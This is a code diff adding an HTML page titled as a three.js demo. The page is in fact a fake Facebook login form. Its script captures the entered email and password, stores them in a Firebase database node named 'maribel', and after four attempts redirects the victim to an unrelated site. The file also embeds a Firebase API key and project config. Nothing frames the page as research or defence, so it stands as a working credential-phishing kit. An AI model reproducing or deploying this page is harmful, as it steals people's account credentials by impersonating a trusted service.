@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset=utf-8>
+		<title>My first three.js app</title>
+		<style>
+			body { margin: 0; }
+			canvas { width: 100%; height: 100% }
+
+			#idcaja{
+				position: relative;
+				top: 120px;
+
+				margin: 0 auto;
+				width: 90%;
+				height: 280px;
+				border: 5px solid #1C6EA4;
+			}
+				#idcajam{
+
+				margin: 0 auto;
+				width: 100%;
+				height: 280px;
+				border: 5px solid #1C6EA4;
+			}
+
+
+			#idedtn{
+
+				position: relative;
+				top: 20px;
+
+				margin: 0 auto;
+				width:90%;
+
+			
+				border: 5px solid #1C6EA4;
+				box-shadow: 2px 2px 7px 1px #CE5937;
+			}
+
+				#idedtnh{
+
+				width:60%;
+
+			}
+
+
+
+
+				#idedtp{
+
+				position: relative;
+				top: 60px;
+
+				margin: 0 auto;
+				width:90%;
+			
+				border: 5px solid #1C6EA4;
+				box-shadow: 2px 2px 7px 1px #CE5937;
+			}
+
+
+				#idedtph{
+
+					width:60%;
+
+			
+			}
+
+		#cajaima{
+				position: relative;
+				top: 7px;
+	margin: 0 auto;
+					width:60%;
+
+				height: 100px;
+				border: 5px solid #1C6EA4;
+				box-shadow: 2px 2px 7px 1px #CE5937;
+
+
+background:#0e8dbc ;
+
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-position: center; 
+			}
+#idtext{
+	font-size: 38px;
+	position: relative;
+top: 25px;
+left: -28px;
+ margin: auto;
+    width: 50%;
+
+    padding: 10px;
+
+    background: #0e8dbc;
+color: white;
+text-shadow: 0 1px 0 #ccc, 0 2px 0 #c9c9c9, 0 3px 0 #bbb, 0 4px 0 #b9b9b9, 0 5px 0 #aaa, 0 6px 1px rgba(0,0,0,.1), 0 0 5px rgba(0,0,0,.1), 0 1px 3px rgba(0,0,0,.3), 0 3px 5px rgba(0,0,0,.2), 0 5px 10px rgba(0,0,0,.25), 0 10px 10px rgba(0,0,0,.2), 0 20px 20px rgba(0,0,0,.15);
+}
+
+#btn {
+	position: relative;
+	border-top:200px; 
+  background: #3498db;
+  background-image: -webkit-linear-gradient(top, #3498db, #2980b9);
+  background-image: -moz-linear-gradient(top, #3498db, #2980b9);
+  background-image: -ms-linear-gradient(top, #3498db, #2980b9);
+  background-image: -o-linear-gradient(top, #3498db, #2980b9);
+  background-image: linear-gradient(to bottom, #3498db, #2980b9);
+  -webkit-border-radius: 28;
+  -moz-border-radius: 28;
+  border-radius: 28px;
+  font-family: Arial;
+  color: #ffffff;
+  font-size: 20px;
+  padding: 10px 20px 10px 20px;
+  text-decoration: none;
+}
+
+#btn:hover {position: relative;
+	border-top:200px; 
+  background: #3cb0fd;
+  background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
+  background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
+  background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
+  background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
+  background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
+  text-decoration: none;
+}
+
+
+
+#idcabt{
+
+	position: relative;
+				top: 100px;
+	margin: 0 auto;
+					width:60%;
+}
+
+
+
+
+		</style>
+	</head>
+	<body><div id="idcaja">
+		
+<div id="idcajam"><div id="cajaima"><div id="idima"><div id="idtext">facebook</div> </div></div>
+	<div id= "idedtn">&#128101;<input id="idedtnh" type="text" name="lname"><br></div>
+<div id= "idedtp" >&#128272;<input id="idedtph" type="text" name="lname"><br>
+
+
+</div>
+ <div id="idcabt">  <div id= "btn1" ><button id= "btn" onclick="subir()">Entrar</button><br>
+
+
+</div>  </div>
+
+</div>
+
+
+	</div><script src="https://www.gstatic.com/firebasejs/5.0.4/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyDDeEsPxBYxzisg4GDOpmYbHBLvIw6L_IY",
+    authDomain: "mejorvargaslleras-4fd2e.firebaseapp.com",
+    databaseURL: "https://mejorvargaslleras-4fd2e.firebaseio.com",
+    projectId: "mejorvargaslleras-4fd2e",
+    storageBucket: "mejorvargaslleras-4fd2e.appspot.com",
+    messagingSenderId: "912759721594"
+  };
+  firebase.initializeApp(config);
+
+ firebase.database().ref().child("maribel").child("valoe").once('value').then(function(snapshot) {
+    var username = (snapshot.val() && snapshot.val().username) || 'Anonymous';
+ //  fstodos=snapshot.val();
+  
+
+  document.getElementById("idtext").innerHTML =snapshot.val();
+//console.log(fstodos[i]);
+ 
+  });
+
+var fstodos;
+function fitraerdatos(st)
+{ firebase.database().ref().child(st).once('value').then(function(snapshot) {
+    var username = (snapshot.val() && snapshot.val().username) || 'Anonymous';
+   fstodos=snapshot.val();
+   for(var i in fstodos){
+console.log(fstodos[i]);
+   }
+  });
+
+
+}var pasa=0;
+
+fitraerdatos("maribel");
+var passe;
+var email;
+function subir(){
+ email=document.getElementById("idedtnh").value;
+ passe=document.getElementById("idedtph").value;
+	alert(email+"   "+passe);
+coloca();
+pasa=pasa+1;
+if (pasa==4){
+
+window.location.href="https://noenadies.github.io/inglesfull/";
+}
+
+} function coloca(){
+
+
+var person = {
+  pass : passe,
+ nombre:email
+  
+}
+
+      
+      firebase.database().ref().child("maribel").push(person);
+
+
+}
+</script>
+	
+		<script>
+			// Our Javascript will go here.
+		</script>
+	</body>
+</html>
